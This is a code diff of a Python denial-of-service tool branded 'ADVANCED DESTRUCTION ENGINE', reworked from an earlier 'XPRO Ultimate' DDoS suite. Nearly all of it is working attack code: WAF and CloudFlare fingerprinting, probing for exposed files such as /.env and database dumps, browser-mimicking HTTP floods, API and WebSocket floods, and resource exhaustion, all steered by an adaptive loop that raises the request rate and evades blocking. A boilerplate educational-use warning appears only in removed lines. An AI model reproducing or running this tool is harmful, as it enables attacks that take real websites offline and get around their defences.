+        """Detect web technologies"""
+        tech_indicators = {
+            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json', 'wordpress'],
+            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
+            'Drupal': ['/sites/default/', 'Drupal'],
+            'Laravel': ['/storage/', 'laravel_session'],
+            'Nginx': ['Server: nginx'],
+            'Apache': ['Server: Apache'],
+            'CloudFlare': ['cf-ray', 'cloudflare', '__cfduid', '__cf_bm'],
+            'AWS': ['x-amz-cf-id', 'x-amz-cf-pop'],
+            'PHP': ['PHP/', 'X-Powered-By: PHP'],
+            'Node.js': ['X-Powered-By: Express'],
+            'React': ['react', 'next.js'],
+            'Vue.js': ['vue', 'nuxt.js']
+        }
         
-        # Parse arguments
-        parser = argparse.ArgumentParser(
-            description='XPRO Ultimate - Multi-Vector DDoS Testing Suite',
-            formatter_class=argparse.RawDescriptionHelpFormatter,
-            epilog="""
-Examples:
-  python3 xpro.py -t example.com -p 80 -m http -th 1000 -d 120
-  python3 xpro.py -t 192.168.1.1 -m mixed --threads 500 --duration 300
-  python3 xpro.py --target victim.com --port 443 --method https
-            """
+        content = response.text.lower()
+        headers = str(response.headers).lower()
+        
+        for tech, indicators in tech_indicators.items():
+            for indicator in indicators:
+                if indicator.lower() in content or indicator.lower() in headers:
+                    if tech not in self.technologies:
+                        self.technologies.append(tech)
+                    break
+    
+    def _detect_protections(self, response):
+        """Detect WAF and protection systems"""
+        content = response.text.lower()
+        headers = str(response.headers).lower()
+        
+        # CloudFlare detection
+        cloudflare_indicators = [
+            'cloudflare',
+            '__cfduid',
+            '__cf_bm',
+            'cf-ray',
+            'checking your browser',
+            'please wait',
+            'ddos protection'
+        ]
+        
+        for indicator in cloudflare_indicators:
+            if indicator in headers or indicator in content:
+                self.protection_detected = True
+                self.protection_type = 'cloudflare'
+                AttackState.stats['cloudflare_detected'] = True
+                break
+        
+        # WAF detection
+        waf_indicators = [
+            '403 forbidden',
+            'access denied',
+            'your request has been blocked',
+            'security violation',
+            'waf',
+            'imperva',
+            'akamai',
+            'sucuri',
+            'incapsula'
+        ]
+        
+        if not self.protection_detected:
+            for indicator in waf_indicators:
+                if indicator in content:
+                    self.protection_detected = True
+                    self.protection_type = 'waf'
+                    AttackState.stats['waf_detected'] = True
+                    break
+        
+        # CAPTCHA detection
+        captcha_indicators = [
+            'captcha',
+            'recaptcha',
+            'hcaptcha',
+            'verify you are human',
+            'are you a human'
+        ]
+        
+        if not self.protection_detected:
+            for indicator in captcha_indicators:
+                if indicator in content:
+                    self.protection_detected = True
+                    self.protection_type = 'captcha'
+                    break
+    
+    def _find_vulnerabilities(self):
+        """Find common vulnerabilities"""
+        import requests
+        
+        vuln_endpoints = [
+            '/xmlrpc.php',
+            '/wp-json/wp/v2/users',
+            '/.env',
+            '/phpinfo.php',
+            '/server-status',
+            '/admin/config.php',
+            '/debug',
+            '/test',
+            '/backup',
+            '/database.sql',
+            '/wp-admin/install.php',
+            '/administrator/index.php',
+            '/cgi-bin/test.cgi',
+            '/api/v1/users',
+            '/graphql'
+        ]
+        
+        for endpoint in vuln_endpoints:
+            try:
+                test_url = f"{self.url.rstrip('/')}{endpoint}"
+                browser = random.choice(BROWSER_SIGNATURES)
+                headers = browser['headers'].copy()
+                headers['User-Agent'] = browser['user_agent']
+                
+                resp = requests.get(test_url, headers=headers, timeout=3, verify=False)
+                if resp.status_code in [200, 403, 500]:
+                    self.vulnerabilities.append(endpoint)
+            except:
+                continue
+
+# ==================== ADVANCED ATTACK VECTORS ====================
+class SmartAttackVectors:
+    """Smart attack vectors with WAF bypass"""
+    
+    @staticmethod
+    async def human_like_request(target, session):
+        """Human-like request with random behavior"""
+        try:
+            # Random human-like delay
+            if Config.HUMAN_LIKE_DELAYS:
+                await asyncio.sleep(random.uniform(0.1, 2.0))
+            
+            # Select random browser signature
+            browser = random.choice(BROWSER_SIGNATURES)
+            
+            # Build realistic URL
+            paths = [
+                '/', '/index.html', '/home', '/main', '/default.aspx',
+                '/about', '/contact', '/products', '/services', '/blog',
+                '/news', '/articles', '/faq', '/help', '/support'
+            ]
+            path = random.choice(paths)
+            
+            # Add realistic parameters
+            params = []
+            if random.random() > 0.4:
+                params.append(f"utm_source={random.choice(['google', 'facebook', 'twitter', 'direct'])}")
+            if random.random() > 0.6:
+                params.append(f"utm_medium={random.choice(['organic', 'cpc', 'social', 'email'])}")
+            if random.random() > 0.7:
+                params.append(f"ref={random.choice(['homepage', 'internal', 'external'])}")
+            if random.random() > 0.5:
+                params.append(f"_={random.randint(1000000000, 9999999999)}")
+            
+            param_str = "?" + "&".join(params) if params else ""
+            
+            # Build URL
+            if target.port in [80, 443]:
+                url = f"{target.protocol}://{target.host}{path}{param_str}"
+            else:
+                url = f"{target.protocol}://{target.host}:{target.port}{path}{param_str}"
+            
+            # Prepare headers
+            headers = browser['headers'].copy()
+            headers['User-Agent'] = browser['user_agent']
+            
+            # Add random referer
+            if random.random() > 0.3:
+                headers['Referer'] = random.choice(REFERERS)
+            
+            # Add cookies for session persistence
+            if random.random() > 0.5:
+                headers['Cookie'] = f"session_id={random.randint(10000, 99999)}; visited=true"
+            
+            # Random request method
+            methods = ['GET', 'HEAD', 'POST']
+            method_weights = [0.7, 0.1, 0.2]  # GET most common
+            method = random.choices(methods, weights=method_weights)[0]
+            
+            if method == 'GET':
+                async with session.get(url, headers=headers, ssl=ssl_context, 
+                                     timeout=aiohttp.ClientTimeout(total=15)) as response:
+                    return await SmartAttackVectors._analyze_response(response, headers, url)
+            
+            elif method == 'POST':
+                # Realistic POST data
+                post_data = {
+                    'search': random.choice(['', 'test', 'query', 'product']),
+                    'email': f"user{random.randint(1, 1000)}@example.com",
+                    'name': random.choice(['John', 'Jane', 'Mike', 'Sarah']),
+                    'message': random.choice(['', 'Hello', 'Test message', 'Inquiry'])
+                }
+                
+                async with session.post(url, data=post_data, headers=headers, ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=15)) as response:
+                    return await SmartAttackVectors._analyze_response(response, headers, url, post_data)
+            
+            else:  # HEAD
+                async with session.head(url, headers=headers, ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    return await SmartAttackVectors._analyze_response(response, headers, url)
+                    
+        except asyncio.TimeoutError:
+            return 'timeout'
+        except Exception as e:
+            return 'error'
+    
+    @staticmethod
+    async def _analyze_response(response, headers, url, data=None):
+        """Analyze HTTP response for protections"""
+        try:
+            content = await response.read()
+            content_text = content.decode('utf-8', errors='ignore').lower()
+            
+            # Update statistics
+            with AttackState.lock:
+                AttackState.stats['bytes_sent'] += len(str(headers)) + len(url)
+                if data:
+                    AttackState.stats['bytes_sent'] += len(str(data))
+                AttackState.stats['bytes_received'] += len(content)
+            
+            # Check for protections
+            protection_indicators = {
+                'cloudflare': ['cloudflare', 'checking your browser', 'please wait', 'ddos protection'],
+                'captcha': ['captcha', 'recaptcha', 'hcaptcha', 'verify you are human', 'are you a human'],
+                'waf': ['403 forbidden', 'access denied', 'blocked', 'security violation', 'waf'],
+                'rate_limit': ['429 too many requests', 'rate limit exceeded', 'slow down']
+            }
+            
+            for protection_type, indicators in protection_indicators.items():
+                for indicator in indicators:
+                    if indicator in content_text:
+                        return f'blocked_{protection_type}'
+            
+            # Check status code
+            if 200 <= response.status < 400:
+                return 'success'
+            elif response.status == 429:
+                return 'blocked_rate_limit'
+            elif response.status in [403, 503, 520, 521, 522, 523]:
+                return 'blocked_waf'
+            else:
+                return 'success'
+                
+        except:
+            return 'error'
+    
+    @staticmethod
+    async def api_endpoint_flood(target, session):
+        """Flood API endpoints"""
+        try:
+            # Common API endpoints
+            api_endpoints = [
+                '/api/v1/users',
+                '/api/v1/products',
+                '/api/v1/posts',
+                '/graphql',
+                '/rest/v1/',
+                '/wp-json/wp/v2/',
+                '/api/auth/login',
+                '/api/search',
+                '/api/health',
+                '/api/status'
+            ]
+            
+            endpoint = random.choice(api_endpoints)
+            url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
+            
+            # API-specific headers
+            headers = {
+                'User-Agent': random.choice(BROWSER_SIGNATURES)['user_agent'],
+                'Accept': 'application/json, text/plain, */*',
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': f"{target.protocol}://{target.host}"
+            }
+            
+            # Add API token if available
+            if random.random() > 0.7:
+                headers['Authorization'] = f'Bearer token_{random.randint(100000, 999999)}'
+            
+            # Random API request
+            if random.random() > 0.5:
+                # GET request
+                async with session.get(url, headers=headers, ssl=ssl_context,
+                                     timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    await response.read()
+                    return 'success' if response.status < 500 else 'error'
+            else:
+                # POST request with JSON
+                json_data = {
+                    'query': random.choice(['', 'test', 'search', 'filter']),
+                    'page': random.randint(1, 10),
+                    'limit': random.choice([10, 20, 50]),
+                    'sort': random.choice(['date', 'name', 'price'])
+                }
+                
+                async with session.post(url, json=json_data, headers=headers, ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    await response.read()
+                    return 'success' if response.status < 500 else 'error'
+                
+        except:
+            return 'error'
+    
+    @staticmethod
+    async def resource_exhaustion(target, session):
+        """Exhaust server resources"""
+        try:
+            # Request large resources
+            resource_paths = [
+                '/large-image.jpg',
+                '/big-file.pdf',
+                '/video.mp4',
+                '/archive.zip',
+                '/database-backup.sql',
+                '/log-file.log'
+            ]
+            
+            path = random.choice(resource_paths)
+            url = f"{target.protocol}://{target.host}:{target.port}{path}"
+            
+            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
+            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
+            
+            # Request with range header to get partial content
+            if random.random() > 0.5:
+                headers['Range'] = f'bytes={random.randint(0, 1000000)}-{random.randint(1000000, 5000000)}'
+            
+            async with session.get(url, headers=headers, ssl=ssl_context,
+                                 timeout=aiohttp.ClientTimeout(total=20)) as response:
+                # Read in chunks to consume bandwidth
+                total_read = 0
+                async for chunk in response.content.iter_chunked(8192):
+                    total_read += len(chunk)
+                    if total_read > 1048576:  # Stop after 1MB
+                        break
+                
+                return 'success' if response.status < 500 else 'error'
+                
+        except:
+            return 'error'
+    
+    @staticmethod
+    async def websocket_connection(target, session):
+        """WebSocket connection flood"""
+        try:
+            ws_url = f"ws://{target.host}:{target.port}/ws" if target.protocol == 'http' else f"wss://{target.host}:{target.port}/ws"
+            
+            # Try common WebSocket endpoints
+            endpoints = ['/ws', '/websocket', '/socket.io/', '/wss', '/live']
+            
+            for endpoint in endpoints:
+                try:
+                    full_ws_url = f"ws://{target.host}:{target.port}{endpoint}" if target.protocol == 'http' else f"wss://{target.host}:{target.port}{endpoint}"
+                    
+                    async with session.ws_connect(full_ws_url, timeout=3) as ws:
+                        # Send ping
+                        await ws.ping()
+                        await asyncio.sleep(0.5)
+                        
+                        # Send some data
+                        await ws.send_str(json.dumps({
+                            'type': 'ping',
+                            'timestamp': int(time.time())
+                        }))
+                        
+                        await asyncio.sleep(1)
+                        await ws.close()
+                        return 'success'
+                        
+                except:
+                    continue
+            
+            return 'error'
+        except:
+            return 'error'
+            # ==================== SMART ATTACK MANAGER ====================
+class SmartAttackManager:
+    """Smart attack manager with adaptive WAF bypass"""
+    
+    def __init__(self, target):
+        self.target = target
+        self.session = None
+        self.attack_methods = [
+            SmartAttackVectors.human_like_request,
+            SmartAttackVectors.api_endpoint_flood,
+            SmartAttackVectors.resource_exhaustion,
+            SmartAttackVectors.websocket_connection
+        ]
+        self.method_weights = [0.5, 0.2, 0.2, 0.1]  # Weighted random selection
+        self.blocked_counter = {
+            'cloudflare': 0,
+            'captcha': 0,
+            'waf': 0,
+            'rate_limit': 0,
+            'total': 0
+        }
+        self.success_counter = 0
+        self.adaptive_mode = 'normal'  # normal, stealth, aggressive
+    
+    async def init_session(self):
+        """Initialize smart session with cookies"""
+        timeout = aiohttp.ClientTimeout(
+            total=Config.REQUEST_TIMEOUT,
+            connect=8,
+            sock_read=12,
+            sock_connect=8
         )
         
-        parser.add_argument('-t', '--target', help='Target IP address or domain name')
-        parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
-        parser.add_argument('-m', '--method', 
-                          choices=['http', 'https', 'slowloris', 'udp', 'tcp', 'dns', 'mixed'],
-                          default='mixed', help='Attack method (default: mixed)')
-        parser.add_argument('-th', '--threads', type=int, default=500,
-                          help='Number of threads (default: 500)')
-        parser.add_argument('-d', '--duration', type=int, default=60,
-                          help='Attack duration in seconds (default: 60)')
-        parser.add_argument('--test', action='store_true',
-                          help='Test connection before attack')
-        parser.add_argument('--no-resolve', action='store_true',
-                          help='Do not resolve domain to IP')
+        connector = aiohttp.TCPConnector(
+            limit=0,
+            ssl=ssl_context,
+            force_close=True,
+            enable_cleanup_closed=True,
+            ttl_dns_cache=300,
+            use_dns_cache=True
+        )
         
-        args = parser.parse_args()
+        # Cookie jar for session persistence
+        cookie_jar = aiohttp.CookieJar()
         
-        # Interactive input if no target provided
-        if not args.target:
-            print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}[?] Enter target (IP or domain, without http://): {Style.RESET_ALL}", end='')
-            args.target = input().strip()
-            
-            if not args.target:
-                print(f"{Fore.RED}[!] Target is required{Style.RESET_ALL}")
-                sys.exit(1)
+        self.session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout,
+            cookie_jar=cookie_jar
+        )
+    
+    def _update_adaptive_mode(self):
+        """Update attack mode based on success rate"""
+        total_attempts = self.blocked_counter['total'] + self.success_counter
+        if total_attempts == 0:
+            return
         
-        # Clean and validate target
-        try:
-            clean_target = validate_target(args.target)
-        except ValueError as e:
-            print(f"{Fore.RED}[!] {str(e)}{Style.RESET_ALL}")
-            sys.exit(1)
+        success_rate = (self.success_counter / total_attempts) * 100
         
-        # Resolve domain to IP
-        target_ip = clean_target
-        if not args.no_resolve and not re.match(r'^\d+\.\d+\.\d+\.\d+$', clean_target):
+        if success_rate < 20:
+            self.adaptive_mode = 'stealth'
+            console.print("[yellow]🔄 Switching to STEALTH mode (low success rate)[/]")
+        elif success_rate > 70:
+            self.adaptive_mode = 'aggressive'
+            console.print("[green]⚡ Switching to AGGRESSIVE mode (high success rate)[/]")
+        else:
+            self.adaptive_mode = 'normal'
+    
+    def _get_attack_delay(self):
+        """Get adaptive delay based on mode"""
+        base_delay = 1.0 / Config.MAX_RPS
+        
+        if self.adaptive_mode == 'stealth':
+            # Slower, more human-like
+            return base_delay * random.uniform(2.0, 5.0)
+        elif self.adaptive_mode == 'aggressive':
+            # Faster, but still random
+            return base_delay * random.uniform(0.5, 1.5)
+        else:  # normal
+            return base_delay * random.uniform(0.8, 2.0)
+    
+    async def smart_worker(self, worker_id):
+        """Smart attack worker with adaptive behavior"""
+        while AttackState.attacking:
             try:
-                target_ip = resolve_target(clean_target)
-                print(f"{Fore.GREEN}[+] Resolved {clean_target} → {target_ip}{Style.RESET_ALL}")
-            except:
-                print(f"{Fore.YELLOW}[!] Using domain name directly{Style.RESET_ALL}")
+                # Update adaptive mode every 100 requests
+                if worker_id == 0 and AttackState.stats['total_requests'] % 100 == 0:
+                    self._update_adaptive_mode()
+                
+                # Select attack method with weights
+                attack_method = random.choices(
+                    self.attack_methods, 
+                    weights=self.method_weights, 
+                    k=1
+                )[0]
+                
+                # Execute attack
+                result = await attack_method(self.target, self.session)
+                
+                # Update statistics
+                with AttackState.lock:
+                    AttackState.stats['total_requests'] += 1
+                    
+                    if result == 'success':
+                        AttackState.stats['successful'] += 1
+                        self.success_counter += 1
+                        self.blocked_counter['total'] = max(0, self.blocked_counter['total'] - 1)
+                    
+                    elif result.startswith('blocked_'):
+                        block_type = result.split('_')[1]
+                        AttackState.stats['blocked'] += 1
+                        self.blocked_counter[block_type] += 1
+                        self.blocked_counter['total'] += 1
+                        
+                        # Adjust weights based on block type
+                        if block_type in ['cloudflare', 'captcha']:
+                            # Reduce human_like weight, increase others
+                            self.method_weights[0] = max(0.1, self.method_weights[0] - 0.05)
+                            self.method_weights[1] = min(0.4, self.method_weights[1] + 0.03)
+                            self.method_weights[2] = min(0.4, self.method_weights[2] + 0.02)
+                    
+                    else:
+                        AttackState.stats['errors'] += 1
+                
+                # Adaptive delay
+                delay = self._get_attack_delay()
+                await asyncio.sleep(delay)
+                    
+            except Exception as e:
+                with AttackState.lock:
+                    AttackState.stats['errors'] += 1
+    
+    async def start_smart_attack(self, num_workers):
+        """Start smart adaptive attack"""
+        await self.init_session()
         
-        # Test connection if requested
-        if args.test:
-            print(f"{Fore.CYAN}[*] Testing connection to {target_ip}:{args.port}...{Style.RESET_ALL}")
-            if not test_connection(target_ip, args.port):
-                print(f"{Fore.YELLOW}[?] Continue anyway? (y/n): {Style.RESET_ALL}", end='')
-                if input().strip().lower() != 'y':
-                    sys.exit(0)
+        # Initial delay for reconnaissance
+        console.print("[yellow]🔍 Performing initial reconnaissance...[/]")
+        await asyncio.sleep(2)
         
-        # Display attack configuration
-        print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}ATTACK CONFIGURATION:{Style.RESET_ALL}")
-        print(f"  Target:     {Fore.YELLOW}{target_ip}:{args.port}{Style.RESET_ALL}")
-        print(f"  Method:     {Fore.CYAN}{args.method.upper()}{Style.RESET_ALL}")
-        print(f"  Threads:    {Fore.MAGENTA}{args.threads}{Style.RESET_ALL}")
-        print(f"  Duration:   {Fore.GREEN}{args.duration} seconds{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
+        # Create workers
+        tasks = []
+        worker_count = min(num_workers, Config.MAX_THREADS)
         
-        # Legal warning
-        print(f"\n{Fore.RED}{'⚠'*60}{Style.RESET_ALL}")
-        print(f"{Fore.RED}WARNING: This tool is for EDUCATIONAL PURPOSES ONLY!{Style.RESET_ALL}")
-        print(f"{Fore.RED}Use only on systems you OWN or have EXPLICIT PERMISSION to test.{Style.RESET_ALL}")
-        print(f"{Fore.RED}Unauthorized use is ILLEGAL and may result in CRIMINAL CHARGES.{Style.RESET_ALL}")
-        print(f"{Fore.RED}{'⚠'*60}{Style.RESET_ALL}")
+        for i in range(worker_count):
+            task = asyncio.create_task(self.smart_worker(i))
+            tasks.append(task)
         
-        # Final confirmation
-        print(f"\**CONTINUATION OF ULTIMATE main.py:**
-        # Final confirmation
-        print(f"\n{Fore.YELLOW}[?] Start attack? (y/n): {Style.RESET_ALL}", end='')
-        confirm = input().strip().lower()
-        
-        if confirm != 'y':
-            print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")
-            sys.exit(0)
-        
-        # Create and start attack
+        # Adaptive monitoring loop
         try:
-            attack = UltimateAttack(target_ip, args.port, args.threads, args.duration)
-            attack.start(args.method)
+            start_time = time.time()
+            last_adjustment = start_time
+            last_report = start_time
             
-        except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}[!] Attack interrupted{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"\n{Fore.RED}[!] Attack failed: {str(e)}{Style.RESET_ALL}")
-            sys.exit(1)
+            while AttackState.attacking and (time.time() - start_time) < Config.ATTACK_DURATION:
+                await asyncio.sleep(1)
+                
+                current_time = time.time()
+                
+                # Adjust strategy every 30 seconds
+                if current_time - last_adjustment > 30:
+                    self._adjust_attack_strategy()
+                    last_adjustment = current_time
+                
+                # Print status every 10 seconds
+                if current_time - last_report > 10:
+                    self._print_status_report()
+                    last_report = current_time
+                    
+        finally:
+            # Cleanup
+            for task in tasks:
+                task.cancel()
+            
+            if self.session:
+                await self.session.close()
+    
+    def _adjust_attack_strategy(self):
+        """Adjust attack strategy based on performance"""
+        total = AttackState.stats['total_requests']
+        if total == 0:
+            return
+        
+        success_rate = (AttackState.stats['successful'] / total) * 100
+        block_rate = (AttackState.stats['blocked'] / total) * 100
+        
+        console.print(f"[cyan]📊 Adaptive adjustment: Success={success_rate:.1f}%, Blocked={block_rate:.1f}%[/]")
+        
+        if block_rate > 50:
+            # High block rate, reduce intensity
+            Config.MAX_RPS = max(100, int(Config.MAX_RPS * 0.7))
+            console.print(f"[yellow]⚠️  High block rate detected, reducing RPS to {Config.MAX_RPS}[/]")
+        
+        elif success_rate > 80 and block_rate < 10:
+            # Good performance, increase intensity
+            Config.MAX_RPS = min(5000, int(Config.MAX_RPS * 1.2))
+            console.print(f"[green]✅ Good performance, increasing RPS to {Config.MAX_RPS}[/]")
+    
+    def _print_status_report(self):
+        """Print periodic status report"""
+        stats = AttackMonitor.calculate_stats()
+        
+        report = Panel.fit(
+            f"[bold cyan]🔄 ADAPTIVE STATUS REPORT[/]\n\n"
+            f"[yellow]Mode:[/] {self.adaptive_mode.upper()}\n"
+            f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
+            f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n"
+            f"[blue]Current RPS:[/] {stats['current_rps']:,}\n"
+            f"[magenta]Threads Active:[/] {Config.MAX_THREADS}\n"
+            f"[cyan]Protection Detected:[/] {self.target.protection_type or 'None'}",
+            border_style="bold cyan",
+            padding=(1, 2)
+        )
+        
+        console.print(report)
+
+# ==================== MONITORING & DISPLAY ====================
+class AttackMonitor:
+    """Monitor and display attack statistics"""
+    current_target = ""
+    
+    @staticmethod
+    def calculate_stats():
+        """Calculate current statistics"""
+        with AttackState.lock:
+            total = AttackState.stats['total_requests']
+            elapsed = time.time() - AttackState.start_time
+            
+            # Calculate RPS
+            current_rps = (total - AttackState.last_count) / 1.0 if elapsed > 0 else 0
+            AttackState.stats['current_rps'] = current_rps
+            AttackState.stats['peak_rps'] = max(AttackState.stats['peak_rps'], current_rps)
+            AttackState.last_count = total
+            
+            # Calculate bandwidth
+            mbps_sent = (AttackState.stats['bytes_sent'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            mbps_recv = (AttackState.stats['bytes_received'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
+            
+            # Success rate
+            success_rate = (AttackState.stats['successful'] / max(total, 1)) * 100
+            
+            return {
+                'total_requests': total,
+                'successful': AttackState.stats['successful'],
+                'blocked': AttackState.stats['blocked'],
+                'errors': AttackState.stats['errors'],
+                'current_rps': int(current_rps),
+                'peak_rps': int(AttackState.stats['peak_rps']),
+                'mbps_sent': mbps_sent,
+                'mbps_recv': mbps_recv,
+                'success_rate': success_rate,
+                'elapsed_time': int(elapsed),
+                'unique_ips': len(AttackState.stats['unique_ips']),
+                'bytes_sent_mb': AttackState.stats['bytes_sent'] / 1024 / 1024,
+                'bytes_recv_mb': AttackState.stats['bytes_received'] / 1024 / 1024,
+                'waf_detected': AttackState.stats['waf_detected'],
+                'cloudflare_detected': AttackState.stats['cloudflare_detected']
+            }
+    
+    @staticmethod
+    def display_dashboard():
+        """Display real-time dashboard"""
+        with Live(refresh_per_second=2, screen=True) as live:
+            while AttackState.attacking:
+                stats = AttackMonitor.calculate_stats()
+                
+                # Create layout
+                layout = Layout()
+                layout.split_column(
+                    Layout(name="header", size=3),
+                    Layout(name="main", ratio=2),
+                    Layout(name="footer", size=7)
+                )
+                
+                # Header with protection info
+                protection_status = ""
+                if stats['cloudflare_detected']:
+                    protection_status = "[red]☁️ CLOUDFLARE DETECTED[/]"
+                elif stats['waf_detected']:
+                    protection_status = "[yellow]🛡️ WAF DETECTED[/]"
+                else:
+                    protection_status = "[green]✅ NO PROTECTION[/]"
+                
+                header = Panel(
+                    f"[bold red]⚡ ADVANCED DESTRUCTION ENGINE v6.0[/] | "
+                    f"[bold cyan]Target:[/] {AttackMonitor.current_target} | "
+                    f"{protection_status} | "
+                    f"[bold green]Status:[/] {'[green]ACTIVE[/]' if AttackState.attacking else '[red]STOPPED[/]'}",
+                    border_style="bold red"
+                )
+                layout["header"].update(header)
+                
+                # Main stats
+                main_table = Table(title="📊 LIVE ATTACK STATISTICS", box=box.ROUNDED, title_style="bold cyan")
+                main_table.add_column("METRIC", style="yellow", width=20)
+                main_table.add_column("VALUE", style="green", width=15)
+                main_table.add_column("STATUS", style="magenta", width=20)
+                
+                main_table.add_row("Total Requests", f"{stats['total_requests']:,}", "")
+                main_table.add_row("Current RPS", f"{stats['current_rps']:,}", f"Peak: {stats['peak_rps']:,}")
+                main_table.add_row("Success Rate", f"{stats['success_rate']:.1f}%", 
+                                 f"[green]✓ {stats['successful']:,}[/] | [yellow]🚫 {stats['blocked']:,}[/] | [red]✗ {stats['errors']:,}[/]")
+                main_table.add_row("Bandwidth", f"▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s", "")
+                main_table.add_row("Data Transferred", f"Sent: {stats['bytes_sent_mb']:.1f} MB | Recv: {stats['bytes_recv_mb']:.1f} MB", "")
+                main_table.add_row("Attack Duration", f"{stats['elapsed_time']}s", f"Max: {Config.ATTACK_DURATION}s")
+                main_table.add_row("Unique IPs", f"{stats['unique_ips']}", "")
+                main_table.add_row("Threads Active", f"{Config.MAX_THREADS}", f"RPS Limit: {Config.MAX_RPS:,}")
+                main_table.add_row("Protection", f"{'☁️ CloudFlare' if stats['cloudflare_detected'] else '🛡️ WAF' if stats['waf_detected'] else '✅ None'}", "")
+                
+                layout["main"].update(Panel(main_table, border_style="bold blue"))
+                
+                # Footer - Progress bars
+                progress_text = Text()
+                progress_text.append(f"\n🎯 Target: {AttackMonitor.current_target}\n", style="bold cyan")
+                progress_text.append(f"⏱️  Elapsed: {stats['elapsed_time']}s | ", style="yellow")
+                progress_text.append(f"📨 Requests: {stats['total_requests']:,} | ", style="green")
+                progress_text.append(f"⚡ RPS: {stats['current_rps']:,}\n", style="red")
+                
+                # Progress bars
+                progress_table = Table(show_header=False, box=None)
+                progress_table.add_column(width=50)
+                
+                # Success rate bar
+                success_bar_length = int(stats['success_rate'] / 2)
+                success_bar = "█" * success_bar_length + "░" * (50 - success_bar_length)
+                progress_table.add_row(f"Success Rate: [{success_bar}] {stats['success_rate']:.1f}%")
+                
+                # RPS progress
+                rps_percent = min(100, (stats['current_rps'] / max(Config.MAX_RPS, 1)) * 100)
+                rps_bar_length = int(rps_percent / 2)
+                rps_bar = "█" * rps_bar_length + "░" * (50 - rps_bar_length)
+                progress_table.add_row(f"RPS Usage:   [{rps_bar}] {stats['current_rps']:,}/{Config.MAX_RPS:,}")
+                
+                # Protection indicator
+                if stats['cloudflare_detected']:
+                    protection_bar = "█" * 25 + "░" * 25
+                    progress_table.add_row(f"Protection:  [{protection_bar}] CLOUDFLARE ACTIVE")
+                elif stats['waf_detected']:
+                    protection_bar = "█" * 15 + "░" * 35
+                    progress_table.add_row(f"Protection:  [{protection_bar}] WAF ACTIVE")
+                
+                layout["footer"].update(Panel(progress_table, title="📈 PROGRESS & PROTECTION", border_style="bold green"))
+                
+                live.update(layout)
+                time.sleep(0.5)
+
+# ==================== MAIN FUNCTIONS ====================
+def show_banner():
+    """Display banner"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    
+    banner = """
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                                                              ║
+    ║    ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ║
+    ║   ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗ ║
+    ║   ██║  ███╗██████╔╝███████║██║     █████╔╝ ███████║██████╔╝ ║
+    ║   ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗ ║
+    ║   ╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║ ║
+    ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
+    ║                                                              ║
+    ║               ADVANCED DESTRUCTION ENGINE v6.0               ║
+    ║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
+    ║                                                              ║
+    ╚══════════════════════════════════════════════════════════════╝
+    """
+    
+    console.print(Panel.fit(banner, border_style="bold red", padding=(1, 2)))
+    
+    # Show features
+    features = Panel.fit(
+        "[bold cyan]✨ ADVANCED FEATURES:[/]\n\n"
+        "[green]✓[/] CloudFlare Protection Bypass\n"
+        "[green]✓[/] WAF/IPS Evasion Techniques\n"
+        "[green]✓[/] Adaptive Attack Strategies\n"
+        "[green]✓[/] Human-like Request Patterns\n"
+        "[green]✓[/] Real-time Protection Detection\n"
+        "[green]✓[/] Smart Rate Limit Avoidance",
+        border_style="bold blue",
+        padding=(1, 2)
+    )
+    
+    console.print(features)
+
+def get_target():
+    """Get target URL from user"""
+    console.print("\n[bold cyan]🎯 TARGET CONFIGURATION[/]")
+    console.print("[yellow]Enter target URL (with http:// or https://)[/]")
+    console.print("[green]Examples:[/]")
+    console.print("  • https://example.com")
+    console.print("  • http://192.168.1.1:8080")
+    console.print("  • http://test.com/admin")
+    console.print("  • https://cloudflare-protected-site.com")
+    
+    while True:
+        target_url = input("\n👉 Target URL: ").strip()
+        
+        if not target_url:
+            console.print("[red]✗ Target URL cannot be empty![/]")
+            continue
+        
+        # Validate URL
+        if not (target_url.startswith('http://') or target_url.startswith('https://')):
+            console.print("[yellow]⚠️  Adding http:// prefix[/]")
+            target_url = 'http://' + target_url
+        
+        return target_url
+
+def configure_attack():
+    """Configure attack parameters"""
+    console.print("\n[bold cyan]⚙️  ADVANCED CONFIGURATION[/]")
+    
+    # Threads
+    while True:
+        threads = input(f"Number of threads [{Config.MAX_THREADS}]: ").strip()
+        if not threads:
+            break
+        if threads.isdigit() and int(threads) > 0:
+            Config.MAX_THREADS = int(threads)
+            break
